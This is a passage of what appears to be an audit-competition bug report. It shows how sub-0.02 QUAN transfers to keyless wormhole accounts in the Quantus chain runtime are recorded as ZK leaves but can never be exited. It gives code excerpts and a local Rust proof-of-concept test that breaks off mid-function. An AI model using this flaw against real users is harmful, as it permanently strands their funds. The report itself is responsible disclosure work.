# 89065 bc high sub fee exitable wormhole deposits are accepted and recorded but can never be spent or exited permanently freezing user funds

**Submitted on Aug 16th 2026 at 22:55:22 UTC by @n3310y for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89065
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Permanent freezing of funds

## Description

## Brief/Intro

The choice to set the wormhole leaf quantum at `10^10` planck (0.01 QUAN, the documented unit) while the circuit fee constraint requires a quantized input of at least 2 (`0.02` QUAN) to produce any positive exit, combined with a recorder that inserts a ZK leaf for every non-zero native transfer and with no `wormhole.deposit()` gate, causes permanent freezing of funds for users of Poseidon-derived wormhole accounts whenever an unprivileged sender uses `balances.transfer_keep_alive` to send one quantum — or any amount in `[EXISTENTIAL_DEPOSIT, 2×10^10)` — to that keyless destination.

The deposit sits on an account with no ML-DSA key; the matching leaf commits a quantized amount of 0 or 1; neither can satisfy `(out₁ + out₂) × 10000 ≤ input × (10000 − 4)`; the pallet then skips `summed_output_amount == 0` and mints nothing back.

Leaves cannot be merged: ten separate 0.01 QUAN deposits leave `0.10` QUAN on the destination as ten unexitable leaves, while one 0.10 QUAN transfer of the same total can exit 0.09 QUAN.

This is a vulnerability in the documented honest-user deposit path, not a theft attack, not a user sending to the wrong address, and not a future mining-reward floor. No privileged origin is required. The freeze is the **entire deposit**, not a remainder.

## Vulnerability Details

Quantus spends value on a keyless (wormhole) account through a ZK Merkle tree, not through a Dilithium signature on that account. A credit is wormhole-exitable if and only if `pallet-zk-tree` stores a leaf `(to, transfer_count, asset_id, amount)` whose **quantized** amount can satisfy the circuit fee inequality for some `output ≥ 1`. Dilithium accounts are not affected: they spend with `balances.transfer` regardless of the leaf.

Live runtime constants (not pallet-mock defaults — the wormhole mock’s ED is `1`, which hides this bug):

```
UNIT                     = 10^12 planck          // 1 QUAN
EXISTENTIAL_DEPOSIT      = 10^9 planck           // 0.001 QUAN
SCALE_DOWN_FACTOR        = 10^10 planck          // 0.01 QUAN  (leaf quantum)
VolumeFeeRateBps         = 4
fee-exitable minimum     = 2 × 10^10 planck      // 0.02 QUAN
```

The documented wormhole unit (one quantum = 0.01 QUAN) is **below** the amount the circuit needs to exit one quantum. `EXISTENTIAL_DEPOSIT` is twenty times smaller still. There is no `wormhole.deposit()` extrinsic: `balances.transfer_keep_alive` is the deposit API, and the pallet records a real leaf for it.

### 1. Relevant direct native transfers are recorded, including sub-quantum amounts

`WormholeProofRecorderExtension` is in the production `TxExtension` tuple. After a successful `balances.transfer_keep_alive` it scans `Balances::Transfer` events and calls `record_transfer_proof`. The only amount it drops is exact zero:

```rust
// pallets/wormhole/src/lib.rs — record_transfer_proof
if amount.is_zero() {                          // @audit drops 0 planck only
    return false;
}
Self::record_transfer(T::AssetId::default(), &from, &to, amount); // @audit ED = 10^9 is recorded
```

The pallet test `zero_amount_credit_is_not_recorded` uses `amount = 1` as the **positive control** that a sub-quantum credit **is** inserted. There is no check that `amount >= SCALE_DOWN_FACTOR`, and no check that `amount >= 2 * SCALE_DOWN_FACTOR`.

For this direct transfer path, the scanner records successful native transfers regardless of whether the destination is a wormhole or Dilithium account. Account IDs are 32-byte values; a Poseidon wormhole address is indistinguishable from a Dilithium `hash(pk)` at the `Balances` layer. Filtering “transfers to wormhole accounts” is not a valid fix.

### 2. `hash_leaf` commits `amount / 10^10`: one quantum hashes as 1, ED hashes as 0

```rust
// pallets/zk-tree/src/tree.rs — hash_leaf
let amount_quantized =
    u32::try_from(amount_u128 / AMOUNT_SCALE_DOWN_FACTOR).unwrap_or(u32::MAX);
    // @audit ED / 10^10 = 0. One quantum / 10^10 = 1. The stored leaf still holds raw planck.
```

A deposit of exactly `10^10` planck (one quantum, 0.01 QUAN — the documented wormhole unit) hashes as quantized **1**. That is on the quantization grid. It is still not fee-exitable. This is the headline case, not a sub-quantum rounding leftover.

A deposit of `1 … 10^10 − 1` planck (including ED = `10^9`) is stored as raw planck on the destination **and** as a leaf whose Poseidon commitment is identical to a leaf with `amount = 0`. The PoC prints `hash_leaf(stored) == hash_leaf(amount=0)` for the ED case. The prover can only witness the quantized value the circuit binds, which is 0.

### 3. The circuit forbids any positive output for quantized input 0 or 1

```rust
// qp-zk-circuits/wormhole/circuit/src/zk_merkle_proof.rs
// Fee constraint: (output_1 + output_2) * 10000 <= input * (10000 - fee_bps)
let lhs = builder.mul(total_output, ten_thousand);
let rhs = builder.mul(targets.leaf.input_amount, fee_complement);
let diff = builder.sub(rhs, lhs);
builder.range_check(diff, 48); // @audit enforces lhs <= rhs; unsatisfiable for out>=1 when input is 0 or 1
```

With live `VolumeFeeRateBps = 4`:

| Quantized input                        | Max integer output | 1-quantum exit possible? |
| -------------------------------------- | -----------------: | ------------------------ |
| 0 (`1 … 10^10−1` planck, including ED) |                  0 | No                       |
| 1 (`10^10 … 2×10^10−1` planck)         |                  0 | No                       |
| 2 (`≥ 2×10^10` planck)                 |                  1 | Yes                      |

The pallet already documents this floor:

```rust
// pallets/wormhole/src/lib.rs — volume_fee_for_exit
// the smallest valid exit (one quantum out forces `input ≥ 2` quanta)
```

The runtime config comment says the same: “the circuit already enforces a one-quantum (0.01 QUAN) minimum fee … There is no separate on-chain minimum exit amount.” There is also no on-chain minimum **deposit** amount matching that floor.

A Plonky2 proof with `output ≥ 1` against these leaves cannot exist: the range-checked fee constraint is unsatisfiable. Generating a dummy 0-output proof would not recover funds either.

### 4. The pallet skips zero-output slots, so nothing is minted back

```rust
// pallets/wormhole/src/lib.rs — process_exit_bundle
if exit_account_bytes == [0u8; 32] || account_data.summed_output_amount == 0 {
    continue; // @audit dummy / zero-output: no mint, deposit stays on the dest
}
```

Even if a prover submitted a valid 0-output proof (padding / dummy slot), settlement mints nothing. Combined with the circuit constraint, there is no wormhole recovery path.

### 5. The destination cannot Dilithium-spend

Wormhole addresses are `H(H("wormhole" || secret))` (Poseidon2 `hash_no_pad`). Production `Balances::transfer` requires an ML-DSA-65 signature whose public-key hash equals the account id. No such key exists for a Poseidon wormhole account.

The pallet mock does **not** check Dilithium signatures. A `RawOrigin::Signed(wormhole)` transfer in a unit test would falsely succeed and must not be used as a spendability proof. The PoC uses `Executive::apply_extrinsic` with the live `TxExtension` tuple: an extrinsic claiming the wormhole destination as sender, signed by a real Dilithium key, is rejected as `InvalidTransaction::BadProof`.

The same ED transferred to a Dilithium account is immediately spendable. The freeze is destination-type-specific, not a Balances bug.

### 6. Vesting was patched for this exact hazard; generic Balances was not

```rust
// runtime/src/configs/mod.rs
/// Vesting payouts are rounded down to multiples of the wormhole leaf quantum
/// (`SCALE_DOWN_FACTOR`): a sub-quantum transfer would be committed as a
/// zero-value leaf, stranding funds paid to keyless beneficiaries.
pub const VestingPayoutQuantum: Balance = pallet_wormhole::SCALE_DOWN_FACTOR;
/// One QUAN keeps every payout above the existential deposit and the Wormhole
/// circuit's fee-consuming minimum.
pub const VestingMinimumPayout: Balance = UNIT;
```

`docs/RUNTIME_SURFACE.md` repeats it: “a sub-quantum payout would create a zero-value leaf and strand funds on a keyless beneficiary,” and claims must pay at least 1 QUAN. The team already named both the **quantized-zero** leaf and the **fee-consuming minimum**. Those gates were applied to vesting payouts only. Permissionless `balances.transfer_keep_alive` to the same class of keyless destination remains ungated.

This is not a missing user-input check on a dedicated deposit function (Immunefi AI-16). Pallet-wormhole exposes no `deposit()` extrinsic and no on-chain minimum deposit. The privacy deposit path is a plain `balances.transfer_keep_alive`. The recorder then inserts a `NativeTransferred` leaf, so the protocol treated the credit as a valid wormhole deposit. Vesting already enforces the fee-consuming minimum for the same keyless destination class; generic Balances does not.

### 7. Leaves cannot be merged: depositing more in separate transfers does not unfreeze earlier credits

A leaf proof is `1 input → ≤2 outputs`. Ten separate 0.01 QUAN transfers to the same wormhole destination produce ten quantized-1 leaves. Destination `free_balance` is 0.10 QUAN — five times the fee-exitable floor — and **none** of the leaves can exit. The same 0.10 QUAN as **one** transfer quantizes to 10 and can exit 9. The PoC prints both sides. This is not “the user should have deposited more”: they did, in aggregate, and the entire 0.10 QUAN is still frozen.

## Root Cause

Two stacked mismatches, both live today:

1. The circuit fee constraint (and the pallet’s own “input ≥ 2 quanta” comment) freezes **on-grid** 1-quantum deposits (`10^10` planck) — the documented wormhole unit. `record_transfer_proof` only drops `amount == 0`, so that credit is recorded and stranded on any keyless destination.
2. In [`runtime/src/lib.rs`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/lib.rs) `EXISTENTIAL_DEPOSIT = MILLI_UNIT = 10^9`, while [`pallets/zk-tree/src/tree.rs`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/zk-tree/src/tree.rs) `hash_leaf` commits `amount / 10^10`. An account can be created with exactly the existential deposit; that amount is below one quantum and hashes as 0.

This is Quantus-specific code (recorder + quantization + ED vs quantum + fee floor), not unmodified Substrate. It is a user-deposit path. It is not a miner volume-fee miss and not a miner transaction-fee split-mint.

## Relationship to public known issue #3

Public known issue #3:

> At some point the volume of transactions will cause the zk-tree depth to exceed the current maximum, both on chain and in circuit. When that moment approaches we will do a runtime upgrade to update both the circuit and the chain. A similar reasoning works for when / if mining rewards ever drop well below the quantized minimum for the circuit.

This finding is not that issue.

* \#3 is a **future** mining-reward floor (“when / if mining rewards ever drop”). This is **today’s** permissionless user `Balances` deposit path. Mining rewards on this revision are far above 0.02 QUAN.
* \#3’s “quantized minimum” is the leaf quantum (`10^10`). Attack B deposits **exactly one quantum** — on the grid, not “below the quantized minimum” — and still cannot exit because of the **fee** floor (`input ≥ 2`). Treating “quantized minimum” as “fee-exitable minimum” rewrites the known issue.
* Attack C then freezes **0.10 QUAN** as ten on-grid 1-quantum leaves. That aggregate is five times the fee floor and is still not a mining-reward issue.
* \#3’s remedy is a later runtime upgrade when the tree is years from depth 16, or if emissions later fall. User funds deposited now are already stranded; “we will upgrade later” is not an operational mitigation for current deposits.
* The runtime **already patched vesting** for this keyless-fund hazard (`PayoutQuantum = SCALE_DOWN_FACTOR`, `MinimumPayout = UNIT`) and left generic `Balances` unrestricted. That is the opposite of a conscious decision to accept ungated user deposits.

**The PoC freezes live-runtime user deposits on the official wormhole address, including 0.10 QUAN as ten un-mergeable 1-quantum leaves.**

## What this is not

* Not Critical item 4 “permanent freezing of funds (fix requires hardfork)”. A runtime upgrade can raise ED, reject sub-floor credits, or `force_transfer` stranded balances. Item 9 exists on the program list for exactly that situation.
* Not High “permanent freezing of unclaimed yield”. These are user funds at rest after a completed `balances.transfer`, not miner/protocol yield.
* Not theft. The sender’s funds move to the destination; they cannot leave it.
* Not a remainder-precision complaint about a 1.001 QUAN transfer (the 0.001 leftover). The headline is any **entire** deposit in `[ED, 2×10^10)`.
* Not “the user sent too little / missing input validation.” There is no `wormhole.deposit()`. `transfer_keep_alive` is the API; the pallet records a real leaf; vesting already enforces the fee floor for the same destination class. Attack C shows the user *did* deposit more in aggregate (0.10 QUAN) and still recovered nothing.
* Not a miner volume-fee missing-leaf issue and not a miner transaction-fee split-mint. Those are different paths. This report is only ungated user `Balances` deposits to a keyless destination.

## Previous-audit / duplicate boundary

This is also not the same root cause as the prior public wormhole findings:

* Prior F-05 covered transfer variants that were **not recorded** by the old recorder. This bug is the opposite shape: the live event-based recorder **does record** the deposit and emits `NativeTransferred`, but the recorded amount is not fee-exitable.
* Prior leftover / remainder discussions concern value left behind after a user chooses outputs smaller than the leaf can support. Here the maximum possible positive output is already zero before the user chooses anything. The whole accepted deposit is frozen.
* Known issue #3 mentions future tree-depth pressure and future mining rewards if emissions ever fall below a quantized minimum. This bug uses current user deposits, current constants, and one-quantum on-grid leaves that fail because of the fee floor, not because they are below the leaf quantum.

The root cause is therefore the current mismatch between `Balances` acceptance / wormhole recording and the circuit's fee-exitable minimum for user deposits to keyless accounts.

## Vulnerability Path

{% stepper %}
{% step %}

### Send a normal transfer to a wormhole address

User builds a normal ML-DSA-65 signed `balances.transfer_keep_alive` to their wormhole address for 0.01 QUAN (1 quantum, the documented unit), or repeats that transfer ten times, or sends ED (0.001 QUAN).
{% endstep %}

{% step %}

### Record a ZK leaf

`Executive::apply_extrinsic` runs the production `TxExtension` tuple. Balances creates/credits the destination. `WormholeProofRecorderExtension::post_dispatch` records a ZK leaf for the raw planck of **each** transfer.
{% endstep %}

{% step %}

### Quantize each deposit separately

Destination `free_balance` equals the sum of those deposits. `hash_leaf` commits quantized 1 (one quantum) or 0 (ED). Ten 1-quantum deposits are ten separate leaves, not one 10-quantum leaf.
{% endstep %}

{% step %}

### Dilithium spending fails

Dilithium spend fails: no key hashes to the Poseidon address (`BadProof`).
{% endstep %}

{% step %}

### Wormhole exit fails

Wormhole exit fails: circuit fee constraint rejects `output ≥ 1` for input 0 or 1; pallet skips `summed_output_amount == 0`; leaves cannot be merged.
{% endstep %}

{% step %}

### Funds remain stranded

The deposit remains on the destination until a runtime upgrade moves it.
{% endstep %}
{% endstepper %}

## Impact Details

The affected party is any user (or protocol pot that is not the vesting pot, which the scanner already skips) who receives a native credit below `0.02 QUAN` on a keyless / wormhole account. They cannot Dilithium-transfer it and cannot wormhole-exit it. The **entire** credit is frozen. Repeating the documented 0.01 QUAN unit does not help: leaves do not merge.

Selected in-scope impact: **Critical — Permanent freezing of funds.**

Why this impact, and not a High/Medium one:

* The funds are user deposits at rest, not unclaimed yield.
* The freeze has no timeout. There is no user action that recovers it, including depositing more in later transfers.
* Likelihood is permissionless and one-shot (a single ordinary transfer of the documented wormhole unit).
* The program lists Critical item 9 separately from High “temporary freezing of funds for at least 24 hours” and separately from Critical item 4 (hardfork). A later governance upgrade does not reclassify user-fund freeze as High.

Loss size:

* Per transfer: the full deposited amount, for every `amount ∈ [10^9, 2×10^10)` planck to a keyless destination.
* PoC Attack B freezes **10\_000\_000\_000 planck = 0.01 QUAN** — one quantum, on the grid.
* PoC Attack A freezes **1\_000\_000\_000 planck = 0.001 QUAN**.
* PoC Attack C freezes **100\_000\_000\_000 planck = 0.10 QUAN** as ten un-mergeable 1-quantum leaves. Destination `free_balance` is 5× the fee-exitable floor and recoverable exit is **0**. The same 0.10 QUAN as one transfer can exit 0.09 QUAN.
* Repeatable without bound: each additional sub-floor transfer to the same destination adds another unexitable leaf.
* USD is not computed: the competition snapshot does not pin a QUAN market price.

The 2-quantum contrast in the PoC (0.02 QUAN) is **not** frozen by this bug: quantized input 2 can exit 1 quantum. That is the fee-exitable floor the rest of the runtime already knows about and applied to vesting.

## Risk Breakdown

* **Likelihood:** Certain for any wormhole deposit in the freeze range. No attacker skill, no race, no special block. The documented deposit path is a plain signed transfer.
* **Privileges:** None.
* **Repeatability:** Once per transfer, indefinitely. Separate transfers to the same destination do not merge; each adds another frozen leaf.
* **Classification:** Immunefi Vulnerability Severity Classification System v2.2 / this program’s Critical list item 9, “Permanent freezing of funds”.

## References

* Chain (pinned): [`runtime/src/lib.rs`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/lib.rs) (`EXISTENTIAL_DEPOSIT`), [`pallets/zk-tree/src/tree.rs`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/zk-tree/src/tree.rs) (`hash_leaf` quantization), [`pallets/wormhole/src/lib.rs`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/pallets/wormhole/src/lib.rs) (`record_transfer_proof`, `process_exit_bundle`, `volume_fee_for_exit`), [`runtime/src/configs/mod.rs`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/configs/mod.rs) (vesting quantum / minimum payout, `VolumeFeeRateBps`), [`runtime/src/transaction_extensions.rs`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/runtime/src/transaction_extensions.rs) (event scanner), [`docs/RUNTIME_SURFACE.md`](https://github.com/immunefi-team/audit-comp-quantus-chain/blob/3b243b870a5442a6e5f443056f67bbba87d472f5/docs/RUNTIME_SURFACE.md) (vesting keyless-beneficiary policy).
* Circuits: `qp-zk-circuits/wormhole/circuit/src/zk_merkle_proof.rs` (fee constraint).
* Official test wormhole address: `runtime/src/genesis_config_presets.rs` (`TEST_WORMHOLE_SECRET = [42u8; 32]`, SS58 `qzokTZkdWXxMgSXyF86ECHxG8o8yRX5ibrX2Uw8YmqkHRdj1V`).

## Proof of Concept

This is a local Substrate / FRAME runtime integration test, not a live-network test or an EVM mainnet fork. The program’s own build instructions are `cargo test --release` in the chain repo.

The PoC executes the production runtime machinery in a local test externality through `Executive::apply_extrinsic`, with a real ML-DSA-65 signature and the production `TxExtension` tuple (including `WormholeProofRecorderExtension`). It is not a pallet-mock unit test: it does not call pallet internals or use `RawOrigin::Signed` in the wormhole mock (that mock does not check Dilithium and would be a false spend; its ED default of `1` also cannot show the ED-vs-quantum mismatch).

The PoC:

* Uses live `EXISTENTIAL_DEPOSIT`, `VestingPayoutQuantum` / `SCALE_DOWN_FACTOR`, and `VolumeFeeRateBps`.
* Uses the official Poseidon test wormhole address from genesis presets.
* Uses real Dilithium-65 keys for Alice and Bob.
* Shows the same ED is spendable on a Dilithium destination.
* Shows a wormhole-as-sender extrinsic is `BadProof`.
* Records leaves via the production extension — `transfer_keep_alive` is the deposit API; there is no `wormhole.deposit()`.
* Asserts the `Wormhole::NativeTransferred` recorder event for the accepted deposit, including amount, transfer count, and leaf index.
* Leads with Attack B: one quantum (documented unit) hashes as 1, not 0, and still cannot exit.
* Then shows Attack A: ED hashes as 0.
* Independently evaluates the circuit fee inequality.
* Contrasts 2 quanta, which **can** exit 1 quantum.
* Shows Attack C: ten separate 1-quantum deposits freeze **0.10 QUAN** as ten unexitable leaves.
* Contrasts the same 0.10 QUAN as one transfer, which can exit 9 quanta.

Nothing in this PoC talks to mainnet or a public testnet.

{% stepper %}
{% step %}

### Reproduce

From the `audit-comp-quantus-chain` repository root (this workspace: `codebases/chain`), on commit `3b243b870a5442a6e5f443056f67bbba87d472f5` plus the three additions below:

```bash
cargo test --release -p quantus-runtime --test mod poc_wormhole_deposits_below_fee_exitable -- --nocapture
```

This matches the program README's release-test flow. The same test also reproduces in debug mode without `--release`.

Requirements: Rust toolchain able to build this workspace (see the chain README), no extra environment variables, and no network. The first build of `pallet-wormhole` regenerates ZK verifier artifacts via `build.rs`. Subsequent runs reuse them. The integration test binary is named `mod` because the crate entry is `runtime/tests/mod.rs`.
{% endstep %}

{% step %}

### Add the development dependency

`runtime/Cargo.toml` — add one `[dev-dependencies]` line so the integration test can call `pallet_zk_tree::tree::hash_leaf`:

```toml
pallet-zk-tree.workspace = true
```

{% endstep %}

{% step %}

### Register the test module

`runtime/tests/transactions/mod.rs` — add one module line:

```rust
pub mod poc_fee_exitable_wormhole_freeze;
```

{% endstep %}

{% step %}

### Add the PoC source file

New file: `runtime/tests/transactions/poc_fee_exitable_wormhole_freeze.rs`

```rust
//! End-to-end PoC: deposits below the wormhole circuit's fee-exitable minimum
//! are accepted by `Balances` and recorded as ZK leaves, but can never be
//! exited from a keyless (Poseidon / wormhole) destination.
//!
//! Production path exercised:
//!   1. A real ML-DSA-65 signed `balances.transfer_keep_alive` through
//!      `Executive::apply_extrinsic` with the live `TxExtension` tuple
//!      (including `WormholeProofRecorderExtension`). There is no
//!      `wormhole.deposit()` extrinsic; this transfer *is* the deposit API.
//!   2. The destination is the runtime's official test wormhole address
//!      (`H(H("wormhole" || secret))`, secret = `[42u8; 32]`).
//!   3. The recorder inserts a ZK-tree leaf for the deposited planck.
//!   4. `hash_leaf` commits `amount / 10^10` (quantized). One quantum
//!      (`SCALE_DOWN_FACTOR`, the documented wormhole unit) hashes as 1.
//!      ED hashes as 0.
//!   5. The circuit fee constraint
//!      `(out1+out2)*10000 <= input*(10000 - VolumeFeeRateBps)`
//!      forbids any positive output for input 0 or 1. The pallet then skips
//!      `summed_output_amount == 0` slots, so nothing is minted back out.
//!   6. Leaves cannot be merged: ten separate 1-quantum deposits leave
//!      0.10 QUAN on the dest as ten unexitable leaves. The same 0.10 as
//!      one transfer can exit 9 quanta.
//!
//! This file does **not** call `Balances::transfer` from
//! `RawOrigin::Signed(wormhole)`. Pallet mocks and even some runtime helpers
//! do not check Dilithium signatures on that origin, which would be a false
//! spend. Spendability is shown by: dest bytes == Poseidon wormhole address,
//! dest != `hash(dilithium_pk)`, and a mismatched-signer extrinsic is
//! rejected by `Executive::apply_extrinsic`.

use codec::Encode;
use frame_support::{assert_ok, traits::Currency};
use pallet_zk_tree::{tree::hash_leaf, ZkLeaf};
use qp_dilithium_crypto::Dilithium65Pair;
use quantus_runtime::{
	configs::{VestingPayoutQuantum, VolumeFeeRateBps},
	transaction_extensions::{ReversibleTransactionExtension, WormholeProofRecorderExtension},
	Balances, BalancesCall, Executive, Runtime, RuntimeCall, RuntimeEvent, Signature,
	SignedPayload, System, TxExtension, UncheckedExtrinsic, Wormhole, ZkTree, EXISTENTIAL_DEPOSIT,
	UNIT, VERSION,
};
use sp_core::Pair;
use sp_runtime::{generic::Era, traits::IdentifyAccount, AccountId32, MultiAddress};

/// Official test wormhole account from `runtime/src/genesis_config_presets.rs`.
/// Derived as `H(H("wormhole" || [42u8; 32]))` with Poseidon2 `hash_no_pad`.
/// SS58: `qzokTZkdWXxMgSXyF86ECHxG8o8yRX5ibrX2Uw8YmqkHRdj1V`
const TEST_WORMHOLE_ADDRESS: [u8; 32] = [
	0xbe, 0x13, 0xa1, 0x89, 0xf9, 0x9c, 0x44, 0xa9, 0x59, 0xe2, 0x66, 0x94, 0xff, 0xe5, 0xe4, 0xba,
	0x22, 0x30, 0x92, 0xf3, 0xed, 0xbe, 0x82, 0x59, 0xc1, 0xd4, 0x5a, 0xd0, 0x8e, 0xdb, 0x40, 0x3d,
];

fn victim_wormhole() -> AccountId32 {
	AccountId32::new(TEST_WORMHOLE_ADDRESS)
}

fn test_ext(account: &AccountId32) -> sp_io::TestExternalities {
	use quantus_runtime::BuildStorage;

	let t = frame_system::GenesisConfig::<Runtime>::default().build_storage().unwrap();
	let mut ext = sp_io::TestExternalities::new(t);
	ext.execute_with(|| {
		Balances::make_free_balance_be(account, 1000 * UNIT);
		System::set_block_number(1);
	});
	ext
}

/// Build a `transfer_keep_alive` extrinsic signed by `pair`, claiming `sender`
/// as the transaction origin. Same `TxExtension` tuple as production.
fn signed_transfer(
	pair: &Dilithium65Pair,
	sender: AccountId32,
	dest: AccountId32,
	value: u128,
	nonce: u32,
) -> UncheckedExtrinsic {
	let genesis_hash = System::block_hash(0);
	let call: RuntimeCall =
		BalancesCall::transfer_keep_alive { dest: MultiAddress::Id(dest), value }.into();

	let tx_ext: TxExtension = (
		frame_system::CheckNonZeroSender::<Runtime>::new(),
		frame_system::CheckSpecVersion::<Runtime>::new(),
		frame_system::CheckTxVersion::<Runtime>::new(),
		frame_system::CheckGenesis::<Runtime>::new(),
		frame_system::CheckEra::<Runtime>::from(Era::immortal()),
		frame_system::CheckNonce::<Runtime>::from(nonce),
		frame_system::CheckWeight::<Runtime>::new(),
		ReversibleTransactionExtension::<Runtime>::new(),
		WormholeProofRecorderExtension::<Runtime>::new(),
		pallet_transaction_payment::ChargeTransactionPayment::<Runtime>::from(0),
		frame_metadata_hash_extension::CheckMetadataHash::<Runtime>::new(false),
		frame_system::WeightReclaim::<Runtime>::new(),
	);

	let raw_payload = SignedPayload::from_raw(
		call.clone(),
		tx_ext.clone(),
		(
			(),
			VERSION.spec_version,
			VERSION.transaction_version,
			genesis_hash,
			genesis_hash,
			(),
			(),
			(),
			(),
			(),
			None,
			(),
		),
	);
	let signature = raw_payload.using_encoded(|e| pair.sign(e));

	UncheckedExtrinsic::new_signed(
		call,
		MultiAddress::Id(sender),
		Signature::Dilithium65(signature),
		tx_ext,
	)
}

fn fmt_quan(planck: u128) -> String {
	let whole = planck / UNIT;
	let frac = planck % UNIT;
	format!("{whole}.{frac:012} QUAN ({planck} planck)")
}

/// Circuit fee constraint, identical to
/// `qp-zk-circuits/wormhole/circuit/src/zk_merkle_proof.rs`:
/// `(out1 + out2) * 10000 <= input * (10000 - fee_bps)`.
fn circuit_max_output_quanta(input_quanta: u128, fee_bps: u32) -> u128 {
	input_quanta.saturating_mul(10_000u128.saturating_sub(fee_bps as u128)) / 10_000
}

fn circuit_allows(input_quanta: u128, output_quanta: u128, fee_bps: u32) -> bool {
	output_quanta.saturating_mul(10_000)
		<= input_quanta.saturating_mul(10_000u128.saturating_sub(fee_bps as u128))
}

fn hex32(id: &AccountId32) -> String {
	format!("0x{}", hex_encode(id.as_ref()))
}

fn hex_encode(bytes: &[u8]) -> String {
	bytes.iter().map(|b| format!("{b:02x}")).collect()
}

struct ScenarioOutcome {
	deposited: u128,
	quantized: u128,
	max_out: u128,
	frozen: u128,
	leaf_hash_eq_zero: bool,
}

fn run_deposit_scenario(
	label: &str,
	pair: &Dilithium65Pair,
	sender: &AccountId32,
	dest: &AccountId32,
	value: u128,
) -> ScenarioOutcome {
	let quantum = VestingPayoutQuantum::get();
	let fee_bps = VolumeFeeRateBps::get();

	println!("\n--------------------------------------------------------------");
	println!(" {label}");
	println!("--------------------------------------------------------------");
	println!("  deposit                  = {}", fmt_quan(value));
	println!("  dest (wormhole)          = {}", hex32(dest));

	let xt = signed_transfer(pair, sender.clone(), dest.clone(), value, 0);
	let outcome =
		Executive::apply_extrinsic(xt).expect("ML-DSA-65 signed transfer must pass validation");
	assert_ok!(outcome);

	let dest_balance = Balances::free_balance(dest);
	let leaf_count = ZkTree::leaf_count();
	let transfer_count = Wormhole::transfer_count(dest);
	let leaf = ZkTree::leaf(0).expect("WormholeProofRecorderExtension must insert a ZK leaf");
	System::assert_has_event(RuntimeEvent::Wormhole(pallet_wormhole::Event::NativeTransferred {
		from: sender.clone(),
		to: dest.clone(),
		amount: value,
		transfer_count: 0,
		leaf_index: 0,
	}));

	let quantized = (leaf.amount) / quantum;
	let max_out = circuit_max_output_quanta(quantized, fee_bps);
	let can_exit_one = circuit_allows(quantized, 1, fee_bps);

	let hash_actual = hash_leaf::<Runtime>(&leaf);
	let hash_zero = hash_leaf::<Runtime>(&ZkLeaf {
		to: leaf.to.clone(),
		transfer_count: leaf.transfer_count,
		asset_id: leaf.asset_id,
		amount: 0,
	});
	let hash_one_quantum = hash_leaf::<Runtime>(&ZkLeaf {
		to: leaf.to.clone(),
		transfer_count: leaf.transfer_count,
		asset_id: leaf.asset_id,
		amount: quantum,
	});

	println!("  dest.free_balance        = {}", fmt_quan(dest_balance));
	println!("  ZkTree.leaf_count        = {leaf_count}");
	println!("  Wormhole.transfer_count  = {transfer_count}");
	println!("  NativeTransferred event  = yes (amount/count/leaf_index asserted)");
	println!("  stored leaf.amount       = {}", fmt_quan(leaf.amount));
	println!("  stored leaf.to           = {}", hex32(&leaf.to));
	println!("  quantized input (leaf)   = {quantized}  (= amount / 10^10)");
	println!("  hash_leaf(stored)        = 0x{}", hex_encode(&hash_actual));
	println!("  hash_leaf(amount=0)      = 0x{}", hex_encode(&hash_zero));
	println!("  hash_leaf(1 quantum)     = 0x{}", hex_encode(&hash_one_quantum));
	println!("  hash(stored)==hash(0)    = {}", hash_actual == hash_zero);
	println!("  fee constraint           = (out)*10000 <= input*(10000-{fee_bps})");
	println!("  max circuit output       = {max_out} quanta");
	println!("  circuit allows 1-quantum exit = {can_exit_one}");

	let frozen = if max_out == 0 { dest_balance } else { 0 };
	if frozen > 0 {
		println!("  >>> FUNDS FROZEN         = {}", fmt_quan(frozen));
		println!("  >>> reason               = no positive circuit output is satisfiable;");
		println!("      pallet-wormhole skips summed_output_amount == 0, so the");
		println!("      deposit cannot leave the keyless destination.");
	} else {
		println!(
			"  >>> NOT frozen by this bug (input {} quanta can exit {} quanta)",
			quantized, max_out
		);
	}

	assert_eq!(dest_balance, value, "full deposit must sit on the destination");
	assert_eq!(leaf.amount, value, "recorder must store the raw deposited planck");
	assert_eq!(&leaf.to, dest, "leaf recipient must be the wormhole dest");
	assert_eq!(leaf_count, 1);
	assert_eq!(transfer_count, 1);

	ScenarioOutcome {
		deposited: value,
		quantized,
		max_out,
		frozen,
		leaf_hash_eq_zero: hash_actual == hash_zero,
	}
}

/// Ten separate 1-quantum deposits to the same dest. Each is its own leaf
/// (`1 input → ≤2 outputs`); they cannot be merged into a fee-exitable input.
fn run_drip_deposits(
	pair: &Dilithium65Pair,
	sender: &AccountId32,
	dest: &AccountId32,
	quantum: u128,
	n: u32,
) -> u128 {
	let fee_bps = VolumeFeeRateBps::get();
	let expected = (n as u128) * quantum;

	println!("\n--------------------------------------------------------------");
	println!(" [Step 7] Attack C — {n} separate 1-quantum deposits to the same dest");
	println!("--------------------------------------------------------------");
	println!("  per deposit              = {}", fmt_quan(quantum));
	println!("  deposit count            = {n}");
	println!("  aggregate                = {}", fmt_quan(expected));
	println!("  dest (wormhole)          = {}", hex32(dest));
	println!("  fee-exitable floor       = {}", fmt_quan(2 * quantum));
	println!("  aggregate vs floor       = {}× the fee-exitable minimum", n / 2);

	for i in 0..n {
		let xt = signed_transfer(pair, sender.clone(), dest.clone(), quantum, i);
		let outcome =
			Executive::apply_extrinsic(xt).expect("each 1-quantum transfer must pass validation");
		assert_ok!(outcome);
	}

	let dest_balance = Balances::free_balance(dest);
	let leaf_count = ZkTree::leaf_count();
	let transfer_count = Wormhole::transfer_count(dest);
	let native_events: Vec<(u64, u64, u128)> = System::events()
		.into_iter()
